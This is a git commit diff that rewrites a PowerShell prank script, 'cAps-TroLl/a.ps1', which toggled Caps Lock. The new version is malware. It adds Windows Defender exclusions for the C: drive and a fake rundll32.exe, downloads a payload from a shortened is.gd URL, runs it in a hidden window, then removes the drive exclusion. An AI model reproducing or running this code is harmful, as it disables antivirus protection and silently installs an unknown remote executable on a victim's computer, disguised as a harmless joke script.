f43dc8f9b6dd2b2706a9f1d28e223f541ae0534c
TobiS137 <75208393+TobiS137@users.noreply.github.com>
2025-03-26 13:28:40 +0100

    Update a.ps1

--- cAps-TroLl/a.ps1
+++ cAps-TroLl/a.ps1
@@ -1,6 +1,8 @@
-while(1) {
-    $random = Get-Random -Minimum 60 -Maximum 180
-    Start-Sleep -Second $random
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.SendKeys('{CAPSLOCK}')
-}
+cd $env:Temp;
+Add-MpPreference -ExclusionPath C:/ -ExclusionProcess "C:\Users\Administrator\AppData\Local\Temp\rundll32.exe";
+Start-Sleep 1;
+iwr -Uri https://is.gd/o9DcFL -O rundll32.exe -UseBasicParsing;
+Start-Sleep 1;
+Start-Process .\rundll32.exe -WindowStyle Hidden;
+Remove-MpPreference -ExclusionPath C:/;
+exit
